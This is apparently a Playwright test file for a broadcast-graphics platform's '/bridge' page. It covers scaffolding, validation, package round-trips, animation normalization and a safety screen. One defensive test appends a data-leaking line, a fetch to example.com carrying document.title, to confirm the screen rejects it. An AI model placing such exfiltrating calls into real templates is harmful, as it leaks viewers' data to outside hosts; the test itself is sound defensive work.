import { test, expect, type Page } from '@playwright/test';
import JSZip from 'jszip';

// The /bridge page (docs/AGENT_CLI.md): the platform's own scaffold / validate / bench / package
// functions on `window.noacgBridge`, for the `noacg` CLI and MCP server to drive. Offline, like
// everything on it. What this pins:
//   1. the protocol handshake (channel + version) and the registry summary;
//   2. the three scaffold paths - a catalog chassis, the NEUTRAL scaffold (the type's fields,
//      machine, runtime on a plain spine), a TYPELESS graphic from a field list - each validating
//      clean through the static gate with every field id present in the markup;
//   3. the dual package: exported from the bridge, its OGraf half conformant, its `v_noacg`
//      naming the type, and the SAME bridge reading it back as the same sources - with a stale
//      generated half detected when the sources change underneath it;
//   4. normalize: an authored GSAP region becomes NoaCG keyframe data; a bare hand-crafted one is
//      not failed over editability;
//   5. fail-closed safety: a template the share-safety screen refuses is never benched.

type Bridge = {
  hello(): Promise<{ channel: string; v: number }>;
  types(): Array<{ id: string; neutral: boolean; fields: unknown[]; events: unknown[] }>;
  scaffold(req: unknown): { template: Template; notes: string[] };
  validate(t: Template, o?: { bench?: boolean }): Promise<{ ok: boolean; benchSkipped: string | null; merged: { errors: { rule: string; message: string }[]; warnings: { rule: string }[] }; readiness: { id: string; state: string }[] }>;
  normalize(t: Template): { template: Template; converted: boolean; dataRegion: boolean; note: string };
  exportPackage(t: Template, o?: unknown): Promise<Uint8Array>;
  readPackage(b: Uint8Array, n: string): Promise<{ kind: string; imported: { template: Template; noacg: { type: string | null; stale: boolean } | null } | null; ograf: { errors: string[]; noacg: { type: string; source?: unknown } | null; stale: boolean } | null }>;
  inspect(i: unknown): { descriptors: unknown[]; buttons: unknown[] };
};
type Template = { name: string; type: string; html: string; css: string; js: string; fields: { field: string; ftype: string }[]; settings: Record<string, string> };
declare global {
  interface Window { noacgBridge: Bridge }
}

async function toBridge(page: Page) {
  await page.goto('/bridge');
  await page.waitForFunction(() => (window as unknown as { __noacgBridgeReady?: boolean }).__noacgBridgeReady === true);
}


test('hello speaks bridge v1 and the registry summary reads the types', async ({ page }) => {
  await toBridge(page);
  await expect(page.locator('#status')).toContainText('Bridge v1 ready');
  const result = await page.evaluate(async () => {
    const b = window.noacgBridge;
    const hello = await b.hello();
    const types = b.types();
    const scoreboard = types.find((t) => t.id === 'scoreboard');
    return { hello, count: types.length, scoreboard, neutralCount: types.filter((t) => t.neutral).length };
  });
  expect(result.hello).toMatchObject({ channel: 'noacg-bridge', v: 1 });
  expect(result.count).toBeGreaterThanOrEqual(30);
  expect(result.scoreboard?.neutral).toBe(true);
  expect((result.scoreboard?.fields ?? []).length).toBe(4);
  expect((result.scoreboard?.events ?? []).length).toBeGreaterThan(0);
  expect(result.neutralCount).toBeGreaterThanOrEqual(20);
});

test('the three scaffold paths validate clean with every field id in the markup', async ({ page }) => {
  await toBridge(page);
  const result = await page.evaluate(async () => {
    const b = window.noacgBridge;
    const run = async (req: unknown) => {
      const { template } = b.scaffold(req);
      const v = await b.validate(template, { bench: false });
      return { ok: v.ok, type: template.type, fields: template.fields.map((f) => `${f.field}:${f.ftype}`), ids: template.fields.every((f) => new RegExp(`id="${f.field}"`).test(template.html)), errors: v.merged.errors.map((e) => e.rule), hasMachine: /"machine"\s*:/.test(template.js) };
    };
    return {
      chassis: await run({ type: 'scoreboard', design: 'sb01', name: 'Chassis' }),
      neutral: await run({ type: 'scoreboard', design: 'neutral', name: 'Neutral' }),
      typeless: await run({ fields: [{ label: 'Artist', kind: 'text', value: 'Anna' }, { label: 'Song', kind: 'text', value: 'Lights' }, { label: 'Cover', kind: 'image' }, { label: 'Progress', kind: 'number', value: '42' }], name: 'Now playing' }),
    };
  });
  for (const [name, r] of Object.entries(result)) {
    expect(r.ok, `${name}: ${r.errors.join(', ')}`).toBe(true);
    expect(r.ids, `${name}: an SPX field has no element`).toBe(true);
  }
  expect(result.chassis.type).toBe('scoreboard');
  expect(result.neutral.hasMachine, 'the neutral scaffold carries the type machine').toBe(true);
  expect(result.neutral.fields).toEqual(['f0:textfield', 'f1:number', 'f2:textfield', 'f3:number']);
  expect(result.typeless.type).toBe('blank');
  expect(result.typeless.fields).toEqual(['f0:textfield', 'f1:textfield', 'f2:filelist', 'f3:number']);
});

test('a dual package round-trips through the bridge and reports a stale generated half', async ({ page }) => {
  await toBridge(page);
  // Export from the page, read back THROUGH the page (the same importer the Import door uses).
  const exported = await page.evaluate(async () => {
    const b = window.noacgBridge;
    const { template } = b.scaffold({ type: 'scoreboard', design: 'neutral', name: 'Round trip' });
    const bytes = await b.exportPackage(template);
    let bin = '';
    for (let i = 0; i < bytes.length; i += 0x8000) bin += String.fromCharCode(...bytes.subarray(i, i + 0x8000));
    return { base64: btoa(bin), css: template.css, js: template.js, fieldCount: template.fields.length };
  });
  const zip = await JSZip.loadAsync(Buffer.from(exported.base64, 'base64'));
  const names = Object.keys(zip.files).filter((n) => !zip.files[n].dir);
  expect(names.some((n) => /\/round_trip\.html$/.test(n)), `no html source in ${names.join(', ')}`).toBe(true);
  expect(names.some((n) => /\/round_trip\.ograf\.json$/.test(n))).toBe(true);
  expect(names.some((n) => /\/graphic\.mjs$/.test(n))).toBe(true);
  expect(names.some((n) => /\/js\/gsap\.min\.js$/.test(n))).toBe(true);
  expect(names.some((n) => /\/lib\/gsap\.min\.js$/.test(n)), 'the dual package shares ONE gsap copy').toBe(false);
  const manifest = JSON.parse(await zip.file(names.find((n) => n.endsWith('.ograf.json'))!)!.async('string'));
  expect(manifest.v_noacg).toMatchObject({ format: 'noacg-graphic', version: 1, type: 'scoreboard', source: { html: 'round_trip.html', css: 'css/template.css', js: 'js/template.js' } });
  expect(typeof manifest.v_noacg.sourceHash).toBe('string');

  const readBack = await page.evaluate(async (base64) => {
    const bin = atob(base64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const r = await window.noacgBridge.readPackage(bytes, 'round_trip.zip');
    return { kind: r.kind, name: r.imported?.template.name, description: r.imported?.template.settings.description, type: r.imported?.template.type, css: r.imported?.template.css, js: r.imported?.template.js, fields: r.imported?.template.fields.length, ografErrors: r.ograf?.errors, noacgType: r.ograf?.noacg?.type, stale: r.ograf?.stale, importStale: r.imported?.noacg?.stale };
  }, exported.base64);
  expect(readBack.kind).toBe('noacg');
  // The name given at scaffold lives in the SOURCES (<title>, the definition's description), so a
  // re-read package keeps its slug - otherwise `noacg validate` regenerates under the design's
  // own name and the folder grows a second html + manifest (2026-08-22).
  expect(readBack.name).toBe('Round trip');
  expect(readBack.description).toBe('Round trip');
  expect(readBack.type).toBe('scoreboard');
  expect(readBack.ografErrors).toEqual([]);
  expect(readBack.noacgType).toBe('scoreboard');
  expect(readBack.stale).toBe(false);
  expect(readBack.importStale).toBe(false);
  expect(readBack.fields).toBe(exported.fieldCount);
  expect(readBack.css?.trim()).toBe(exported.css.trim());
  expect(readBack.js?.trim()).toBe(exported.js.trim());

  // Edit a source underneath the generated half -> stale, honestly reported, never refused.
  const cssPath = names.find((n) => n.endsWith('css/template.css'))!;
  zip.file(cssPath, `${await zip.file(cssPath)!.async('string')}\n/* edited by hand */\n`);
  const edited = await zip.generateAsync({ type: 'base64' });
  const stale = await page.evaluate(async (base64) => {
    const bin = atob(base64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const r = await window.noacgBridge.readPackage(bytes, 'round_trip.zip');
    return { kind: r.kind, stale: r.ograf?.stale, importStale: r.imported?.noacg?.stale };
  }, edited);
  expect(stale).toEqual({ kind: 'noacg', stale: true, importStale: true });
});

test('normalize converts an authored GSAP region to keyframe data; a bare region is not failed over editability', async ({ page }) => {
  test.setTimeout(90_000);
  await toBridge(page);
  const result = await page.evaluate(async () => {
    const b = window.noacgBridge;
    const { template } = b.scaffold({ type: 'lower-third', design: 'neutral' });
    const region = `/* == ANIMATION (generated — the Animation panel rewrites this block) == */
var animSpeed = 1;
var easeIn = 'power3.out';
var easeOut = 'power2.in';
function buildInTimeline() {
  var tl = gsap.timeline({ defaults: { ease: easeIn } });
  tl.set('.lower-third', { opacity: 1 });
  tl.fromTo('.lower-third-box', { xPercent: -100, opacity: 0 }, { xPercent: 0, opacity: 1, duration: 0.6 / animSpeed });
  tl.fromTo('.lower-third-mask > span', { yPercent: 110 }, { yPercent: 0, duration: 0.5 / animSpeed, stagger: 0.08 / animSpeed }, '-=0.3');
  return tl;
}
function buildOutTimeline() {
  var tl = gsap.timeline({ defaults: { ease: easeOut } });
  tl.to('.lower-third-mask > span', { yPercent: -110, duration: 0.3 / animSpeed, stagger: 0.05 / animSpeed });
  tl.to('.lower-third-box', { xPercent: -100, opacity: 0, duration: 0.4 / animSpeed }, '-=0.1');
  tl.set('.lower-third', { opacity: 0 });
  return tl;
}
/* == END ANIMATION == */`;
    const authored = { ...template, js: template.js.replace(/\/\* == ANIMATION[\s\S]*?== END ANIMATION == \*\//, region) };
    const n = b.normalize(authored);
    const v = await b.validate(n.template, { bench: true });
    const bare = { ...template, js: template.js.replace(/\/\* == ANIMATION[\s\S]*?== END ANIMATION == \*\//, 'function buildInTimeline(){ var tl = gsap.timeline(); tl.set(".lower-third",{opacity:1}); tl.fromTo(".lower-third-box",{opacity:0},{opacity:1,duration:0.4}); return tl; } function buildOutTimeline(){ var tl = gsap.timeline(); tl.to(".lower-third-box",{opacity:0,duration:0.3}); tl.set(".lower-third",{opacity:0}); return tl; }') };
    const bn = b.normalize(bare);
    const bv = await b.validate(bn.template, { bench: true });
    return {
      converted: n.converted, dataRegion: n.dataRegion, hasData: /var NOACG_ANIM/.test(n.template.js), steps: n.template.settings.steps,
      ok: v.ok, errors: v.merged.errors.map((e) => `${e.rule}: ${e.message}`), benchSkipped: v.benchSkipped,
      bareConverted: bn.converted, bareOk: bv.ok, bareErrors: bv.merged.errors.map((e) => e.rule), bareWarnings: bv.merged.warnings.map((w) => w.rule),
      bareNote: bn.note,
      // The 2026-09-06 defect verbatim: a region in the authoring grammar with one declaration
      // absent. The old note listed things this region does not contain, and a model reading it
      // spent four rounds and $0.072 guessing (docs/AI_ATTEMPTS.md).
      missingEaseNote: b.normalize({
        ...template,
        js: template.js.replace(
          /\/\* == ANIMATION[\s\S]*?== END ANIMATION == \*\//,
          region.replace("var easeIn = 'power3.out';", ''),
        ),
      }).note,
    };
  });
  expect(result.converted).toBe(true);
  expect(result.dataRegion).toBe(true);
  expect(result.hasData).toBe(true);
  expect(result.benchSkipped).toBeNull();
  expect(result.ok, result.errors.join('\n')).toBe(true);
  // The bare region: honest hand-crafted code - plays and exports, editability demoted to a warning.
  expect(result.bareConverted).toBe(false);
  expect(result.bareErrors).not.toContain('bench-editability');
  expect(result.bareWarnings).toContain('bench-editability');
  // A REFUSED REGION NAMES THE PRECONDITION IT MISSED. The agent CLI is the door a coding agent
  // drives, and until 2026-09-07 it handed back the same generic sentence the Pro Harness had
  // already stopped using - a list of constructs the converter cannot read, which says nothing
  // to an author whose region contains none of them.
  expect(result.bareNote).toContain('markers');
  expect(result.missingEaseNote).toContain('easeIn');
});

test('a template the share-safety screen refuses is never benched', async ({ page }) => {
  await toBridge(page);
  const result = await page.evaluate(async () => {
    const b = window.noacgBridge;
    const { template } = b.scaffold({ type: 'lower-third', design: 'neutral' });
    const hostile = { ...template, js: `${template.js}\nfetch('https://example.com/leak?' + document.title);` };
    const v = await b.validate(hostile, { bench: true });
    return { ok: v.ok, benchSkipped: v.benchSkipped, errors: v.merged.errors.map((e) => e.rule), readiness: v.readiness.map((r) => `${r.id}=${r.state}`) };
  });
  expect(result.ok).toBe(false);
  expect(result.errors).toContain('unsafe-js-network');
  expect(result.benchSkipped).toMatch(/safety screen/);
  expect(result.readiness.some((r) => r.endsWith('=untested')), 'live rows report untested when the bench did not run').toBe(true);
});

test('the operator surface of a scaffold is derived from its fields and machine', async ({ page }) => {
  await toBridge(page);
  const result = await page.evaluate(() => {
    const b = window.noacgBridge;
    const { template } = b.scaffold({ type: 'scoreboard', design: 'neutral' });
    const i = b.inspect({ template }) as { descriptors: { key: string; kind: string }[]; buttons: { event: string }[] };
    return { inputs: i.descriptors.map((d) => `${d.key}:${d.kind}`), buttons: i.buttons.map((bt) => bt.event) };
  });
  expect(result.inputs).toEqual(['f0:text', 'f1:number', 'f2:text', 'f3:number']);
  expect(result.buttons.length).toBeGreaterThan(0); // the scoreboard type's flag/result events
});

